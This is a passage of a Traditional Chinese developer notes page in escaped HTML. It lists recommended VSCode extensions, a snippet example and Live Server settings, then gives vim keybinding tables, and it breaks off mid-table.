id=\"vscode-插件\">VSCode 插件</h2>\n<ul>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://qiita.com/sensuikan1973/items/74cf5383c02dbcd82234#1-vscode-icons\">VSCode のオススメ拡張機能 24 選 (と Tips をいくつか)</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://qiita.com/rana_kualu/items/4a4ce6ea7f489dc19f63\">JavaScript 開発者のための優秀な VSCode ツール 26 選</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://qiita.com/rana_kualu/items/9f6919311f1407a71c5f\">これがなくては生きていけない VS Code エクステンション 10 選 - Qiita</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://medium.com/productivity-freak/the-ultimate-vscode-setup-for-js-react-6a4f7bd51a2\">The Ultimate VSCode Setup for Front End/JS/React | by Elad Ossadon | Productivity Freak | Medium</a></li>\n</ul>\n<h3 id=\"外觀樣式\">外觀樣式</h3>\n<table>\n<thead>\n<tr>\n<th>名稱</th>\n<th>說明</th>\n</tr>\n</thead>\n<tbody><tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://marketplace.visualstudio.com/items?itemName=CoenraadS.bracket-pair-colorizer\">Bracket Pair Colozier</a></td>\n<td>括號上色</td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://marketplace.visualstudio.com/items?itemName=oderwat.indent-rainbow\">Indent-rainbow</a></td>\n<td>色彩區隔不同深度的縮排</td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://marketplace.visualstudio.com/items?itemName=SirTori.indenticator\">Indenticator</a></td>\n<td>重點標示目前縮排線</td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://marketplace.visualstudio.com/items?itemName=IBM.output-colorizer\">Output Colorizer</a></td>\n<td>色彩化 VSCode 的 Console 輸出</td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://marketplace.visualstudio.com/items?itemName=robertohuertasm.vscode-icons\">VSCode-icons</a></td>\n<td>圖示主題</td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://marketplace.visualstudio.com/items?itemName=PKief.material-icon-theme\">MATERIAL ICON THEME</a></td>\n<td>Material 風格圖示主題</td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://marketplace.visualstudio.com/items?itemName=Equinusocio.vsc-material-theme\">MATERIAL THEME</a></td>\n<td>Material 風格主題</td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://marketplace.visualstudio.com/items?itemName=johnpapa.vscode-peacock\">PEACOCK</a></td>\n<td>VSCode 多視窗獨立色彩</td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://marketplace.visualstudio.com/items?itemName=mechatroner.rainbow-csv\">Rainbow CSV</a></td>\n<td></td>\n</tr>\n</tbody></table>\n<h3 id=\"內容生成\">內容生成</h3>\n<table>\n<thead>\n<tr>\n<th>名稱</th>\n<th>說明</th>\n</tr>\n</thead>\n<tbody><tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://marketplace.visualstudio.com/items?itemName=formulahendry.auto-rename-tag\">Auto Rename Tag</a></td>\n<td>自動修改前後對應標籤</td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://marketplace.visualstudio.com/items?itemName=bradgashler.htmltagwrap\">htmltagwrap</a></td>\n<td><code>Alt + W</code></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://marketplace.visualstudio.com/items?itemName=formulahendry.auto-close-tag\">Auto Close Tag</a></td>\n<td>自動關閉標籤</td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://marketplace.visualstudio.com/items?itemName=sleistner.vscode-fileutils\">File Utils</a></td>\n<td><code>F1</code> -&gt; 輸入 <code>File:</code> 處理複製、移動、新增等功能</td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://marketplace.visualstudio.com/items?itemName=christian-kohler.path-intellisense\">PATH INTELLISENSE</a></td>\n<td>自動補完輸入檔案路徑</td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://marketplace.visualstudio.com/items?itemName=ionutvmi.path-autocomplete\">Path Autocomplete</a></td>\n<td>自動補完檔案路徑</td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://marketplace.visualstudio.com/items?itemName=Zignd.html-css-class-completion\">INTELLISENSE FOR CSS, SCSS</a></td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://marketplace.visualstudio.com/items?itemName=Zignd.html-css-class-completion\">IntelliSense for CSS class names in HTML</a></td>\n<td>自動從已輸入的 class 內補完命名</td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://marketplace.visualstudio.com/items?itemName=christian-kohler.npm-intellisense\">NPM INTELLISENSE</a></td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://marketplace.visualstudio.com/items?itemName=xabikos.JavaScriptSnippets\">JAVASCRIPT (ES6) CODE SNIPPETS</a></td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://marketplace.visualstudio.com/items?itemName=patbenatar.advanced-new-file\">advanced-new-file</a></td>\n<td><code>cmd+alt+n</code> (Mac), <code>ctrl+alt+n</code> (Win, Linux)</td>\n</tr>\n<tr>\n<td>Code Spell Checker</td>\n<td>檢查拼字錯誤</td>\n</tr>\n<tr>\n<td>Encode Decode</td>\n<td>轉換字串編碼</td>\n</tr>\n<tr>\n<td>Gremlins Tracker</td>\n<td>檢查難以辨識的問題字元</td>\n</tr>\n<tr>\n<td>Tabnine Autocomplet AI</td>\n<td>預測自動完成內容</td>\n</tr>\n<tr>\n<td>Toggle Quotes</td>\n<td>切換單雙引號</td>\n</tr>\n<tr>\n<td>I18n Ally</td>\n<td>即時翻譯選取字串</td>\n</tr>\n</tbody></table>\n<h4 id=\"user-snippet\">USER SNIPPET</h4>\n<ul>\n<li>透過快捷鍵快速產生內容</li>\n<li>完全由使用者自訂</li>\n<li><code>File（檔案）</code> -&gt; <code>Preferences（喜好設定）</code> -&gt; <code>User Snippets（使用者程式碼片段）</code></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://snippet-generator.app/\">snippet generator</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://dev.to/chaseadamsio/using-current-date-and-time-in-vs-code-snippets-4gog\">Using Current Date and Time In VS Code Snippets - DEV</a></li>\n</ul>\n<pre class=\"language-json\"><code class=\"language-json\">{\n  \"Print to console\": {\n    \"scope\": \"javascript,typescript\",\n    \"prefix\": \"log\",\n    \"body\": [\"console.log('$1')\", \"$2\"],\n    \"description\": \"Log output to console\"\n  }\n}</code></pre><ul>\n<li><code>scope</code>：指定此 snippets 的使用語言</li>\n<li><code>prefix</code>：指定此 snippets 的快捷關鍵字</li>\n<li><code>description</code>：顯示此 snippets 時右邊的內容說明</li>\n<li><code>body</code>：此 snippets 的實際輸入內容</li>\n<li><code>$1</code>、<code>$2</code>：可以在按下 Tab 鍵後讓錨點跳至此處</li>\n</ul>\n<h3 id=\"輔助工具\">輔助工具</h3>\n<table>\n<thead>\n<tr>\n<th>名稱</th>\n<th>說明</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>Debugger for Chrome</td>\n<td>VSCode 版的 Debugger，可以直接在編輯器上下斷點或監控執行狀態</td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://marketplace.visualstudio.com/items?itemName=JakeWilson.vscode-cdnjs\">CDNJS</a></td>\n<td><code>F1</code> -&gt; 輸入 <code>cdnjs</code></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://marketplace.visualstudio.com/items?itemName=ritwickdey.LiveServer\">Live Server</a></td>\n<td>在本地建立可即時反應檔案更新的預覽伺服器</td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://marketplace.visualstudio.com/items?itemName=ritwickdey.live-sass\">LIVE SASS COMPILER</a></td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://marketplace.visualstudio.com/items?itemName=MS-vsliveshare.vsliveshare-pack\">LIVE SHARE EXTENSION PACK</a></td>\n<td>同步分享 Coding</td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://marketplace.visualstudio.com/items?itemName=Shan.code-settings-sync\">Setting Sync</a></td>\n<td>Upload Key : <code>Shift + Alt + U</code> <br> Download Key : <code>Shift + Alt + D</code></td>\n</tr>\n<tr>\n<td>EditorConfig</td>\n<td>統一 IDE 細項設定</td>\n</tr>\n<tr>\n<td>Polacode-2020</td>\n<td>快速產生程式碼選取區塊截圖</td>\n</tr>\n<tr>\n<td>Peacock</td>\n<td>指定不同專案視窗色彩</td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://marketplace.visualstudio.com/items?itemName=miramac.vscode-exec-node\">NODE EXEC</a></td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://marketplace.visualstudio.com/items?itemName=WallabyJs.quokka-vscode\">Quokka.js</a></td>\n<td><code>Ctrl/Cmd + Shift + P</code> -&gt; type <code>Quokka</code></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://marketplace.visualstudio.com/items?itemName=WallabyJs.wallaby-vscode\">Wallaby.js</a></td>\n<td><code>Ctrl/Cmd + Shift + P</code> -&gt; type <code>Wallaby</code> OR <code>Ctrl/Cmd + Shift + =</code></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://marketplace.visualstudio.com/items?itemName=hnw.vscode-auto-open-markdown-preview\">AUTO-OPEN MARKDOWN PREVIEW</a></td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://marketplace.visualstudio.com/items?itemName=bierner.markdown-preview-github-styles\">MARKDOWN PREVIEW GITHUB STYLING</a></td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://marketplace.visualstudio.com/items?itemName=octref.vetur\">VETUR</a> / 各種語言框架輔助套件</td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://marketplace.visualstudio.com/items?itemName=alefragnani.project-manager\">PROJECT MANAGER</a></td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://marketplace.visualstudio.com/items?itemName=teamchilla.blueprint\">BLUEPRINT - NEW FILES AND FOLDERS OF FILES FROM TEMPLATES</a></td>\n<td>建立泛用樣板檔案</td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://marketplace.visualstudio.com/items?itemName=silverlakesoftware.searchdocsets-vscode\">Search Docsets</a></td>\n<td><code>Shift + F1</code></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://marketplace.visualstudio.com/items?itemName=sdras.vue-vscode-extensionpack\">Vue VS Code Extension Pack - Visual Studio Marketplace</a></td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://marketplace.visualstudio.com/items?itemName=znck.vue-language-features\">VueDX - Visual Studio Marketplace</a></td>\n<td></td>\n</tr>\n</tbody></table>\n<h4 id=\"live-server\">Live Server</h4>\n<ul>\n<li>也有提供自訂進入點、PORT、HTTPS 功能、預設以無痕模式開啟等等</li>\n<li>HTTPS 需搭配 <a target=\"_blank\" rel=\"nofollow\" href=\"https://github.com/FiloSottile/mkcert\">mkcert</a> 產生本地 SSL 檔案、修改系統 hosts 檔案模擬自訂網域</li>\n<li><code>settings.json</code>：</li>\n</ul>\n<pre class=\"language-json\"><code class=\"language-json\">{\n  \"liveServer.settings.CustomBrowser\": \"chrome:PrivateMode\",\n  \"liveServer.settings.port\": 443,\n\n  \"liveServer.settings.https\": {\n    \"enable\": true,\n    \"cert\": \"\", // 需使用完整路徑\n    \"key\": \"\", // 需使用完整路徑\n    \"passphrase\": \"\"\n  },\n\n  \"liveServer.settings.host\": \"\",\n  \"liveServer.settings.proxy\": {\n    \"enable\": true,\n    \"baseUri\": \"/api/\",\n    \"proxyUri\": \"http://localhost:3000\"\n  },\n\n  \"liveServer.settings.root\": \"/web\",\n  \"liveServer.settings.mount\": [[\"/enterURL\", \"./mountFolder\"]]\n}</code></pre><h4 id=\"blueprint\">Blueprint</h4>\n<ul>\n<li>模板資料夾預設存在 <code>blueprint-templates</code> 資料夾底下</li>\n<li>可以依據官方說明文裡面，在 <code>settings.json</code> 裡面修改參照模板資料夾的路徑</li>\n<li><code>&quot;blueprint.templatesPath&quot;: [&quot;./.vscode/blueprint-templates&quot;</code></li>\n<li>模板分類概念是最外面的 Folder 是替模板命名用，裡面的子層資料夾才會收納模板檔案</li>\n<li>可以使用 <code>__name__</code> 從輸入自訂資料夾或檔案的名稱，檔案內的自訂名稱則要改為雙括寫法 <code>{{name}}</code></li>\n<li>其它常用的命名法有 <code>__pascalCase_name__</code> 和 <code>__lowerDotCase_name__</code></li>\n<li>可以使用 <code>$</code> 開頭自行命名額外變數</li>\n</ul>\n<h3 id=\"規範限制\">規範限制</h3>\n<table>\n<thead>\n<tr>\n<th>名稱</th>\n<th>說明</th>\n</tr>\n</thead>\n<tbody><tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://marketplace.visualstudio.com/items?itemName=eamodio.gitlens\">GITLENS</a></td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://marketplace.visualstudio.com/items?itemName=donjayamanne.githistory\">GIT HISTORY</a></td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://marketplace.visualstudio.com/items?itemName=streetsidesoftware.code-spell-checker\">CODE SPELL CHECKER</a></td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://marketplace.visualstudio.com/items?itemName=esbenp.prettier-vscode\">Prettier - code formatter</a></td>\n<td><code>CMD + Shift + P</code> -&gt; Format Document</td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://marketplace.visualstudio.com/items?itemName=dbaeumer.vscode-eslint\">ESLint</a></td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://marketplace.visualstudio.com/items?itemName=joelday.docthis\">DOCUMENT THIS</a></td>\n<td><code>Ctrl+Alt+D</code> and again <code>Ctrl+Alt+D</code></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://marketplace.visualstudio.com/items?itemName=stevencl.addDocComments\">Add jsdoc comments</a></td>\n<td><code>F1</code> -&gt; <code>Add doc comments</code></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://marketplace.visualstudio.com/items?itemName=kisstkondoros.vscode-codemetrics\">CODEMETRICS</a></td>\n<td>顯示函式的計算複雜度</td>\n</tr>\n</tbody></table>\n<h3 id=\"彩蛋番外\">彩蛋番外</h3>\n<table>\n<thead>\n<tr>\n<th>名稱</th>\n<th>說明</th>\n</tr>\n</thead>\n<tbody><tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://marketplace.visualstudio.com/items?itemName=nhoizey.gremlins\">GREMLINS TRACKER</a></td>\n<td></td>\n</tr>\n<tr>\n<td>CSS PEEK / 各種檔案關聯輔助套件</td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://marketplace.visualstudio.com/items?itemName=aaron-bond.better-comments\">BETTER COMMENTS</a></td>\n<td>依註解功能不同標上相應的色彩，如 <code>#!</code> 或是 <code>#?</code>、<code>#*</code></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://marketplace.visualstudio.com/items?itemName=Gruntfuggly.todo-tree\">TODO TREE</a></td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://marketplace.visualstudio.com/items?itemName=wayou.vscode-todo-highlight\">TODO Highlight</a></td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://marketplace.visualstudio.com/items?itemName=fabiospampinato.vscode-todo-plus\">Todo+</a></td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://marketplace.visualstudio.com/items?itemName=pnp.polacode\">POLACODE</a></td>\n<td>截取程式碼片段儲存為圖片</td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://marketplace.visualstudio.com/items?itemName=shengchen.vscode-leetcode\">LEETCODE</a></td>\n<td>在 VSCode 上解 LeetCode</td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://marketplace.visualstudio.com/items?itemName=rogalmic.bash-debug\">Bash Debug</a></td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://marketplace.visualstudio.com/items?itemName=formulahendry.code-runner\">Code Runner</a></td>\n<td>To run code: <code>Ctrl+Alt+N</code> <br> To stop the running code: <code>Ctrl+Alt+M</code></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://marketplace.visualstudio.com/items?itemName=wix.vscode-import-cost\">Import Cost</a></td>\n<td>顯示引用檔案大小</td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://marketplace.visualstudio.com/items?itemName=jebbs.plantuml\">PlantUML</a></td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"http://plantuml.com/en/\">PlantUML in a nutshell</a></td>\n<td>支援快速繪製各種 UML 圖形</td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://marketplace.visualstudio.com/items?itemName=ryu1kn.partial-diff\">Partial Diff</a></td>\n<td>比較不同版本內容差異</td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://marketplace.visualstudio.com/items?itemName=chrmarti.regex\">Regex Previewer</a></td>\n<td><code>Ctrl+Alt+M</code></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://marketplace.visualstudio.com/items?itemName=humao.rest-client\">REST Client</a></td>\n<td><code>Ctrl+Alt+R</code>(<code>Cmd+Alt+R</code> for macOS)</td>\n</tr>\n</tbody></table>\n<h4 id=\"字型\">字型</h4>\n<table>\n<thead>\n<tr>\n<th>名稱</th>\n<th>說明</th>\n</tr>\n</thead>\n<tbody><tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://github.com/tomokuni/Myrica/blob/master/product/Myrica.md\">Myrica</a></td>\n<td>統合 Inconsolata 和源真黑體與 Mgen+ 的英日等寬字型</td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://rictyfonts.github.io/\">Ricty</a></td>\n<td>統合 Inconsolata 和 Migu 1M 的英日等寬字型</td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://github.com/tonsky/FiraCode\">FIRA CODE</a></td>\n<td>將如 <code>===</code> 或 <code>&lt;$</code> 的記述轉成單一字符的程式用字型</td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://github.com/adobe-fonts/source-code-pro\">SOURCE CODE PRO</a></td>\n<td>由 Adobe 推出的程式用等寬字型</td>\n</tr>\n</tbody></table>\n<h2 id=\"vim\">vim</h2>\n<ul>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"http://www.vixual.net/blog/archives/234\">vi 與 vim 的指令整理</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"http://linux.vbird.org/linux_basic/0310vi.php\">vim 程式編輯器</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://qiita.com/KoyanagiHitoshi/items/82ef910432552d0a4553\">アニメーションで学ぶ Vim 入門 ～精選 10 機能～</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://prev.net-newbie.com/linux/commands/vi.html\">ｖｉエディタの使い方</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://qiita.com/jiroshin/items/ee86ea426a51fa24b319\">ぼくの Vim さばきを支える設定とその導入手順を紹介する</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://qiita.com/hachi8833/items/7beeee825c11f7437f54\">Vim 幼稚園から Vim 小学校へ - Qiita</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://qiita.com/jnchito/items/57ffda5712636a9a1e62\">脱初心者を目指すなら知っておきたい便利な Vim コマンド 25 選 (Vimmer レベル診断付き) - Qiita</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://qiita.com/fasahina/items/2767891134028648f288\">vim を使うとき十字キーで移動して、vimmer に殺されるその前に</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://qiita.com/hodanov/items/399590f61db5a56077d7\">なぜ私は Vim を使うことになったのか〜開発用エディターとしての Vim の有用性に関するご報告〜</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://qiita.com/gorilla0513/items/4d1c610f1283bbe46f81\">Vim のターミナルの真の力お見せしますよ</a></li>\n</ul>\n<h3 id=\"切換模式\">切換模式</h3>\n<table>\n<thead>\n<tr>\n<th>按鍵</th>\n<th>功能</th>\n</tr>\n</thead>\n<tbody><tr>\n<td><code>v</code></td>\n<td>觀看模式</td>\n</tr>\n<tr>\n<td><code>i</code></td>\n<td>於錨點處進入編輯模式</td>\n</tr>\n<tr>\n<td><code>I</code></td>\n<td>於錨點所在行的第一個非空白字元處進入編輯模式</td>\n</tr>\n<tr>\n<td><code>a</code></td>\n<td>於錨點行最後處進入編輯模式</td>\n</tr>\n<tr>\n<td><code>A</code></td>\n<td>於錨點所在行的最後一個字元處進入編輯模式</td>\n</tr>\n<tr>\n<td><code>o</code></td>\n<td>於錨點處下方新增一行後進入編輯模式</td>\n</tr>\n<tr>\n<td><code>O</code></td>\n<td>於錨點處上方新增一行後進入編輯模式</td>\n</tr>\n<tr>\n<td><code>cc</code></td>\n<td>刪除錨點所在行內容後進入編輯模式</td>\n</tr>\n<tr>\n<td><code>ESC</code></td>\n<td>取消指令或退出編輯模式</td>\n</tr>\n<tr>\n<td><code>:</code></td>\n<td>指令模式</td>\n</tr>\n<tr>\n<td><code>r</code></td>\n<td>進入僅更換一個字元的編輯模式</td>\n</tr>\n</tbody></table>\n<h3 id=\"移動錨點\">移動錨點</h3>\n<table>\n<thead>\n<tr>\n<th>按鍵</th>\n<th>功能</th>\n</tr>\n</thead>\n<tbody><tr>\n<td><code>h</code></td>\n<td>左</td>\n</tr>\n<tr>\n<td><code>j</code></td>\n<td>下</td>\n</tr>\n<tr>\n<td><code>k</code></td>\n<td>上</td>\n</tr>\n<tr>\n<td><code>l</code></td>\n<td>右</td>\n</tr>\n<tr>\n<td><code>gg</code></td>\n<td>移到第一行</td>\n</tr>\n<tr>\n<td><code>G</code></td>\n<td>移到最後一行</td>\n</tr>\n<tr>\n<td><code>[數字] + G</code></td>\n<td>移動到第 <code>[數字]</code> 行</td>\n</tr>\n<tr>\n<td><code>^</code>／<code>0</code></td>\n<td>移動到該行最前面</td>\n</tr>\n<tr>\n<td><code>$</code></td>\n<td>移動到該行最後面</td>\n</tr>\n<tr>\n<td><code>[數字] + Space</code></td>\n<td>向右移動 <code>[數字]</code> 個字元</td>\n</tr>\n<tr>\n<td><code>[數字] + Enter</code></td>\n<td>向下移動 <code>[數字]</code> 行</td>\n</tr>\n<tr>\n<td><code>ctrl+f</code></td>\n<td>移動至次頁</td>\n</tr>\n<tr>\n<td><code>ctrl+b</code></td>\n<td>移動至前頁</td>\n</tr>\n<tr>\n<td><code>H</code></td>\n<td>移動至畫面最上端</td>\n</tr>\n<tr>\n<td><code>M</code></td>\n<td>移動至畫面中央處</td>\n</tr>\n<tr>\n<td><code>L</code></td>\n<td>移動至畫面最下方</td>\n</tr>\n<tr>\n<td><code>w</code></td>\n<td>移至下個字串首個字元</td>\n</tr>\n<tr>\n<td><code>b</code></td>\n<td>移至上個字串首個字元</td>\n</tr>\n<tr>\n<td><code>W</code></td>\n<td>移至下個字串首個字元（包含符號）</td>\n</tr>\n<tr>\n<td><code>B</code></td>\n<td>移至上個字串首個字元（包含符號）</td>\n</tr>\n<tr>\n<td><code>e</code></td>\n<td>移至下個字串最後一個字元</td>\n</tr>\n<tr>\n<td><code>ea</code></td>\n<td>移至下個字串最後一個字元並進入編輯模式</td>\n</tr>\n</tbody></table>\n<h3 id=\"標記與複製\">標記與複製</h3>\n<table>\n<thead>\n<tr>\n<th>按鍵</th>\n<th>功能</th>\n</tr>\n</thead>\n<tbody><tr>\n<td><code>v</code></td>\n<td>開始字串標記</td>\n</tr>\n<tr>\n<td><code>v -&gt; Ctrl + V</code></td>\n<td>開始區塊標記</td>\n</tr>\n<tr>\n<td><code>V</code></td>\n<td>開始行標記</td>\n</tr>\n<tr>\n<td><code>d</code></td>\n<td>刪除標記的內容</td>\n</tr>\n<tr>\n<td><code>y</code></td>\n<td>複製標記的內容</td>\n</tr>\n<tr>\n<td><code>yy</code></td>\n<td>複製錨點行</td>\n</tr>\n<tr>\n<td><code>yyp</code></td>\n<td>複製貼上</td>\n</tr>\n<tr>\n<td><code>yG</code></td>\n<td>複製錨點行到最後一行</td>\n</tr>\n<tr>\n<td><code>y1G</code></td>\n<td>複製錨點行到第一行</td>\n</tr>\n<tr>\n<td><code>y$</code></td>\n<td>複製錨點處至最後一個字元為止的內容</td>\n</tr>\n<tr>\n<td><code>y0</code></td>\n<td>複製錨點處到第一個字元為止的內容</td>\n</tr>\n<tr>\n<td><code>p</code></td>\n<td>在下一行貼上複製或刪除的內容</td>\n</tr>\n<tr>\n<td><code>P</code></td>\n<td>在上一行貼上複製或刪除的內容</td>\n</tr>\n<tr>\n<td><code>Ctrl + R -&gt; 0</code></td>\n<td>在下一行貼上複製或刪除的內容，適用於編輯模式及指令行</td>\n</tr>\n</tbody></table>\n<h3 id=\"搜尋與取代\">搜尋與取代</h3>\n<table>\n<thead>\n<tr>\n<th>按鍵</th>\n<th>功能</th>\n</tr>\n</thead>\n<tbody><tr>\n<td><code>/[字串]</code></td>\n<td>向下搜尋 <code>字串</code></td>\n</tr>\n<tr>\n<td><code>/\\c[字串]</code></td>\n<td>向下搜尋 <code>字串</code>，不分大小寫</td>\n</tr>\n<tr>\n<td><code>*</code></td>\n<td>將錨點移到 <code>字串</code> 上，直接按 <code>*</code> 也可以做向下搜尋</td>\n</tr>\n<tr>\n<td><code>?[字串]</code></td>\n<td>向上搜尋 <code>字串</code></td>\n</tr>\n<tr>\n<td><code>?\\c[字串]</code></td>\n<td>向上搜尋 <code>字串</code>，不分大小寫</td>\n</tr>\n<tr>\n<td><code>:set ic</code></td>\n<td>搜尋時不分大小寫</td>\n</tr>\n<tr>\n<td><code>:set noic</code></td>\n<td>搜尋時分辨大小寫</td>\n</tr>\n<tr>\n<td><code>n</code></td>\n<td>繼續下一個搜尋結果</td>\n</tr>\n<tr>\n<td><code>N</code></td>\n<td>繼續上一個搜尋結果</td>\n</tr>\n<tr>\n<td><code>:[起始行],[終止行]s/[搜尋字串]/[取代字串]/gic</code></td>\n<td>取代第 <code>n</code> 行到第 <code>n</code> 行中的 <code>字串</code><br> (<code>g</code>: 整行全部 <code>i</code>: 不分大小寫 <code>c</code>: 詢問)</td>\n</tr>\n<tr>\n<td><code>:1,$s/[搜尋字串]/[取代字串]/gic</code></td>\n<td>取代全部字串<br> (<code>g</code>: 整行全部 <code>i</code>: 不分大小寫 <code>c</code>: 詢問)</td>\n</tr>\n<tr>\n<td><code>:noh</code></td>\n<td>結束搜尋</td>\n</tr>\n</tbody></table>\n<h3 id=\"刪除\">刪除</h3>\n<table>\n<thead>\n<tr>\n<th>按鍵</th>\n<th>功能</th>\n</tr>\n</thead>\n<tbody><tr>\n<td><code>dd</code></td>\n<td>刪除錨點行</td>\n</tr>\n<tr>\n<td><code>[數字] + dd</code></td>\n<td>刪除 <code>[數字]</code> 行</td>\n</tr>\n<tr>\n<td><code>ddp</code></td>\n<td>剪下貼上</td>\n</tr>\n<tr>\n<td><code>dG</code></td>\n<td>刪除錨點行起到最後一行的內容</td>\n</tr>\n<tr>\n<td><code>d1G</code></td>\n<td>刪除錨點行起到第一行的內容</td>\n</tr>\n<tr>\n<td><code>d$</code></td>\n<td>刪除錨點處到最後一個字元的內容</td>\n</tr>\n<tr>\n<td><code>d0</code></td>\n<td>刪除錨點處到第一個字元的內容</td>\n</tr>\n</tbody></table>\n<h3 id=\"檔案功能\">檔案功能</h3>\n<table>\n<thead>\n<tr>\n<th>按鍵</th>\n<th>功能</th>\n</tr>\n</thead>\n<tbody><tr>\n<td><code>:w</code></td>\n<td>存檔</td>\n</tr>\n<tr>\n<td><code>:!w</code></td>\n<td>強制存檔</td>\n</tr>\n<tr>\n<td><code>:w 